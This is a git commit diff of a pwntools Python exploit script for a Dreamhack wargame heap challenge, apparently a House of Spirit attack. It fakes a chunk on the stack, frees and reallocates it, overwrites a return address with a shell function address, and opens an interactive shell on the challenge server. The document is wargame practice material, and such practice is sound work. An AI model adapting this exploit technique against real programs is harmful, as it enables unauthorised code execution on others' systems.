701d6196899c5b634760f8af83c17a39947dec1b
woounnan <woounnan@gmail.com>
2020-11-22 19:52:02 +0000

    t

--- dreamhack/house_of_split/ex.py
+++ dreamhack/house_of_split/ex.py
@@ -1,21 +1,24 @@
 from pwn import *
 context.update(log_level = 'debug')
 p = None
-def Add(size):
+def Create(size, data):
 	global p
 	p.sendlineafter('>', '1')
 	p.sendlineafter('Size: ', str(size))
-def Free(addr):
+	p.sendlineafter('Data: ', data)
+def Delete(addr):
 	global p
 	p.sendlineafter('>', '2')
-	p.sendlineafter('Address: ', str(addr))
-def Edit(idx):
-	global p
-	p.sendlineafter('>', '3')
-	p.sendlineafter('Index: ', str(idx))
-p = process('test')
-addr_stack = int(p.recvline().replace('\n', '\x00'), 16)
+	p.sendlineafter('Addr: ', str(addr))
+#p = process('house_of_spirit')
+p = remote('host1.dreamhack.games', 22662)
+size = 0x30
+p.sendline(p64(0) + p64(size + 0x10 + 1))
+p.recvuntil('name: ')
+addr_stack = int(p.recvline().split(':')[0],16)
 log.info('stack: ' + hex(addr_stack))
-#to ebp : 0xa0
-Add(0xa0-8)
-
+addr_shell = 0x400940
+#raw_input('debug: ' +str(p.pid))
+Delete(addr_stack+16)
+Create(size, 'a'*(size-8) + p64(addr_shell))
+p.interactive()
